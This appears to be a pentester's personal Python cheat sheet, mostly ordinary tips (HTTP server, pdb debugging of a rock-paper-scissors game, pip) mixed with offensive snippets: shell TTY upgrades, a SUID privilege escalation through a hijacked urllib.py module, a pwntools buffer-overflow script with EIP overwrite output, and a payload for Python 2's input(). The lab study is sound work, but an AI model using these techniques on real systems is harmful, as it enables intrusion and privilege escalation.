# 🤖 python
Tags: #🤖
Related to: 
See also: 
Previous: [[PROGRAMMING]], [[Getting Started]], [[DNS Enumeration Using Python]], [[Introduction to Python 3]]

## Description

Python is an interpreted high-level general-purpose programming language.

## Usage Examples

### Create HTTP server

	python -m SimpleHTTPServer 80
	python3	-m http.server 80

### Upgrade a terminal for improved functionality (arrow keys, history, etc.)

| **Command**   | **Description**   |
| --------------|-------------------|
| `echo $TERM` and `stty size` | Get local terminal type and size |
| `which python` or `which python3` or `which script` | Locate an interpreter |
| `python -c 'import pty; pty.spawn("/bin/bash")'` or `script -q /dev/null -c bash` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo;` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `export TERM=xterm-256color` then `stty rows 67 columns 318` | Set remote terminal type and size |

### Preserve SUID on shell invocation

Python first checks for modules in the current working directory, before looking in the other paths. We can attempt to hijack loading of the legitimate call or urllib modules, so that our malicious module is loaded instead. Let's create a urllib.py file in the /home/frank folder with the contents below:

	vi urllib.py

```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```

	/tmp/sh -p	// #

### Convert Python 2 to Python 3

```python
from pwn import *
import sys

if len(sys.argv) < 3:
	print "Usage: {} ip port".format(sys.argv[0])
	sys.exit()

ip = sys.argv[1]
port = sys.argv[2]

payload = "A" * 1028 + "B" * 4 + "C" * 500

r = remote(ip, port)
r.recvuntil(':')
r.sendline("Admin")
r.recvuntil(':')
r.sendline(payload)
```

	python3 bof_win.py 10.10.0.2 3333 // doesn't work

Convert Python 2 script:

	2to3-2.7 bof_win.py -w

```
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: Refactored bof_win.py
--- bof_win.py  (original)
+++ bof_win.py  (refactored)
@@ -2,7 +2,7 @@
 import sys
 
 if len(sys.argv) < 3:
-    print "Usage: {} ip port".format(sys.argv[0])
+    print("Usage: {} ip port".format(sys.argv[0]))
     sys.exit()
 
 ip = sys.argv[1]
RefactoringTool: Files that were modified:
RefactoringTool: bof_win.py
```

	python3 bof_win.py 10.10.0.2 3333	// success

```
EAX 00000010
ECX 00000002
EDX 0019F918
EBX 00312000
ESP 0019FD54 ASCII "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
EBP 41414141
ESI 00464C28 ASCII "0LF"
EDI 00464CA0
EIP 42424242
```

### Create binary executables

```
Windows:	py2exe, PyInstaller, Nuitka
Linux		Freeze, PyInstaller
Mac:		py2app
```

[py2exe](http://www.py2exe.org/), [pyinstaller](http://www.pyinstaller.org/), [nuitka](http://nuitka.net)
[uncompyle6](https://pypi.org/project/uncompyle6), [pycdc](https://github.com/zrax/pycdc)

### Decompile pyc files

```
uncompyle6
Decompyle++
```

### Manually create a byte-compiled .pyc from an imported .py

```python
>>> import py_compile
>>> py_compile.compile("backdoor-final.py")
'__pycache__/backdoor-final.cpython-36.pyc'
```

### Execute command from command line

	python3 -c "print('A'*5000)" | wc -c 	// 5001, includes \n

### Proper script structure

```python
#!/usr/bin/env python3 -tt
#-*- coding: UTF-8 -*-
#You can comment a single line with a pound sign
""" The first string in the program is the DocString and """
""" is used by help function to describe the program."""

import sys
def main():
	"""A 'Docstring' for the main function here"""
	print("You passed the argument "+ sys.argv[1])

if __name__ == "__main__":
main()
```

	-tt	// stop with error if using tabs and spaces

### Debug Python script

**Objectives:**
- Our Rock, Paper, Scissors game is broken. Please fix it!
- Debug the "debugme.py" file in the essential-workshop directory.
- Run debugme.py several times until we find the error
- Debug it! $ python -m pdb debugme.py

		cat debugme.py

```python
# This program has 2 logic errors in it.   Use the pdb program to step through them and find them.
import random
import sys

if sys.version_info.major==2:
    input = raw_input

def askplayer(prompt):
    theirchoice=""
    while theirchoice in ['rock','paper',"scissors"]:
        theirchoice=input(prompt)
    return theirchoice

def mychoice(choices):
    randomnumber=random.randint(1,3)
    try: 
        computerchoice=choices[randomnumber]
    except:
        pass
    return computerchoice
    
def compare(p1,p2):
    if p1==p2:
        return 0
    if p1=='rock' and p2=='paper':
        return 2
    if p1=='rock' and p2=='scissors':
        return 1
    if p1=='paper' and p2=='rock':
        return 1
    if p1=='paper' and p2=='scissors':
        return 2
    if p1=='scissors' and p2=="paper":
         return 1
    if p1=='scissors' and p2=='rock':
        return 2

choices  = ["rock", "paper", "scissors"]

p=askplayer("Enter rock,paper or scissors:")
c=mychoice(choices)
print("I choose "+c)
if compare(p,c)==0:
    print("its a Tie!")
if compare(p,c)==1:
    print("You WIN!!")
if compare(p,c)==2:
    print("You LOSE!!!")
```

	python -m pdb debugme.py

```
list <enter>	// examine source code
break #			// break on line #
c				// continue
s				// step into
n				// next line
p <expression>	// print
quit()			// quit
```

```python
(Pdb) list
  1  	# This program has 2 logic errors in it.   Use the pdb program to step through them and find them.
  2  ->	import random
  3  	import sys
  4  	
  5  	if sys.version_info.major==2:
  6  	    input = raw_input
  7  	
  8  	def askplayer(prompt):
  9  	    theirchoice=""
 10  	    while theirchoice in ['rock','paper',"scissors"]:
 11  	        theirchoice=input(prompt)

(Pdb) <enter>
 12  	    return theirchoice
 13  	
 14  	def mychoice(choices):
 15  	    randomnumber=random.randint(1,3)
 16  	    try:
 17  	        computerchoice=choices[randomnumber]
 18  	    except:
 19  	        pass
 20  	    return computerchoice
 21  	
 22  	def compare(p1,p2):

(Pdb) <enter>
 23  	    if p1==p2:
 24  	        return 0
 25  	    if p1=='rock' and p2=='paper':
 26  	        return 2
 27  	    if p1=='rock' and p2=='scissors':
 28  	        return 1
 29  	    if p1=='paper' and p2=='rock':
 30  	        return 1
 31  	    if p1=='paper' and p2=='scissors':
 32  	        return 2
 33  	    if p1=='scissors' and p2=="paper":

(Pdb) <enter>
 34  	         return 1
 35  	    if p1=='scissors' and p2=='rock':
 36  	        return 2
 37  	
 38  	choices  = ["rock", "paper", "scissors"]
 39  	
 40  	p=askplayer("Enter rock,paper or scissors:")	// here
 41  	c=mychoice(choices)
 42  	print("I choose "+c)
 43  	if compare(p,c)==0:
 44  	    print("its a Tie!")

(Pdb) b 40
Breakpoint 1 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:40

(Pdb) c
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(40)<module>()
-> p=askplayer("Enter rock,paper or scissors:")

(Pdb) s
--Call--
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(8)askplayer()
-> def askplayer(prompt):

(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(9)askplayer()
-> theirchoice=""

(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(10)askplayer()
-> while theirchoice in ['rock','paper',"scissors"]:

(Pdb) p theirchoice in ['rock', 'paper', 'scissors']
False

(Pdb) quit()
```

Modify while loop to: `while theirchoice not in ['rock','paper',"scissors"]:`

	python debugme.py

```bash
Enter rock,paper or scissors:rock
I choose paper
You LOSE!!!
```

	python debugme.py

```bash
Enter rock,paper or scissors:rock
Traceback (most recent call last):
  File "debugme.py", line 41, in <module>
    c=mychoice(choices)
  File "debugme.py", line 20, in mychoice
    return computerchoice
UnboundLocalError: local variable 'computerchoice' referenced before assignment
```

	python -m pdb debugme.py

```python
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(2)<module>()
-> import random

(Pdb) break mychoice
Breakpoint 1 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:14

(Pdb) c
Enter rock,paper or scissors:rock
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(15)mychoice()
-> randomnumber=random.randint(1,3)

(Pdb) list
 10  	    while theirchoice not in ['rock','paper',"scissors"]:
 11  	        theirchoice=input(prompt)
 12  	    return theirchoice
 13  	
 14 B	def mychoice(choices):
 15  ->	    randomnumber=random.randint(1,3)
 16  	    try:
 17  	        computerchoice=choices[randomnumber]
 18  	    except:
 19  	        pass
 20  	    return computerchoice

(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(16)mychoice()
-> try:

(Pdb) p randomnumber
1

(Pdb) clear 1
Deleted breakpoint 1 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:14

(Pdb) break 16
Breakpoint 2 at /home/student/Documents/pythonclass/essentials-workshop/debugme.py:16

(Pdb) condition 2 randomnumber==3
New condition set for breakpoint 2.

(Pdb) c
Enter rock,paper or scissors:rock
I choose scissors
You WIN!!
The program finished and will be restarted
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(2)<module>()
-> import random

(Pdb) c
Enter rock,paper or scissors:rock
I choose paper
You LOSE!!!
The program finished and will be restarted
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(2)<module>()
-> import random

(Pdb) c
Enter rock,paper or scissors:rock
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(16)mychoice()
-> try:

(Pdb) p randomnumber
3
```

randomnumber is set to 3. Considering the following two lines of code, what will happen when we execute the next line that looks up an index of 3 in the 'choices' array?

```
choices  = ["rock", "paper", "scissors"]
computerchoice=choices[randomnumber]
```

```python
(Pdb) n
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(17)mychoice()
-> computerchoice=choices[randomnumber]

(Pdb) n
IndexError: list index out of range
> /home/student/Documents/pythonclass/essentials-workshop/debugme.py(17)mychoice()
-> computerchoice=choices[randomnumber]

(Pdb) p len(choices)
3

(Pdb) p choices[1]
'paper'

(Pdb) p choices[2]
'scissors'

(Pdb) p choices[3]
*** IndexError: list index out of range

(Pdb) quit()
```

Correct the code: `randomnumber=random.randint(0,2)`

### Exploit insecure input() function

	__import__("os").system("id")

### Turn binary data into a string

**To turn binary data into a string, you almost always want to encode with LATIN-1 because it has a one-for-one mapping of characters between 0 and 255.**

### Install pip

	python3 -m ensurepip --defauly-pip	// or
	
	curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
	python3 get-pip.py

### Add directory to Python path

	python3 -c "import sys; print(sys.path)"
	sys.path.append('/new/path')

# References

```
https://python.org/download/releases						// download python
http://sourceforge.net/projects/pywin32						// download Python Windows Extensions
https://docs.python.org/3/reference/lexical_analysis.html	// lexical analysis
https://pypi.org											// Python maintained list of third-party packages
https://docs.python.org/3/py-modindex.html					// Python modules already installed by default
https://python.org/dev/peps/pep-0008						// style guide << this is a should-read!
```
